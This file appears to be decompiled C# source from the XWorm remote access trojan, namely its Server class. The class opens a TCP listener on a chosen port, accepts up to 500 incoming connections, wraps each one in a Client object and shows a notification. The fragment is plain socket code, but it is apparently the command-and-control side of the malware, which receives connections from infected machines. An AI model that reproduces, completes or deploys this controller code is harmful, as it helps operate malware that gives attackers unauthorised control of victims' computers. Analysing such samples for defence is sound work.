using System;
using System.Diagnostics;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using XWorm.My;

namespace XWorm
{
	// Token: 0x0200003F RID: 63
	public class Server
	{
		// Token: 0x06000A07 RID: 2567 RVA: 0x00058BAC File Offset: 0x00056DAC
		public Server()
		{
			this.allDone = new ManualResetEvent(false);
		}

		// Token: 0x06000A08 RID: 2568 RVA: 0x00058BC4 File Offset: 0x00056DC4
		public void Start(int Port)
		{
			try
			{
				this.S = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
				IPEndPoint localEP = new IPEndPoint(IPAddress.Any, Port);
				this.S.ReceiveBufferSize = 51200;
				this.S.SendBufferSize = 51200;
				this.S.Bind(localEP);
				this.S.Listen(500);
				this.S.BeginAccept(new AsyncCallback(this.EndAccept), null);
				bool notef = SettingsHelper.NOTEF;
				if (notef)
				{
					MyProject.Forms.Main.NotifyIcon1.BalloonTipText = "SocketStarted.. " + Conversions.ToString(Port);
					MyProject.Forms.Main.NotifyIcon1.ShowBalloonTip(100);
				}
			}
			catch (Exception ex)
			{
				MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
				Environment.Exit(0);
			}
		}

		// Token: 0x06000A09 RID: 2569 RVA: 0x00058CCC File Offset: 0x00056ECC
		public void EndAccept(IAsyncResult ar)
		{
			try
			{
				Client client = new Client(this.S.EndAccept(ar));
			}
			catch (Exception ex)
			{
				Debug.WriteLine("EndAccept " + ex.Message);
			}
			finally
			{
				this.S.BeginAccept(new AsyncCallback(this.EndAccept), null);
			}
		}

		// Token: 0x0400043D RID: 1085
		public Socket S;

		// Token: 0x0400043E RID: 1086
		public ManualResetEvent allDone;
	}
}
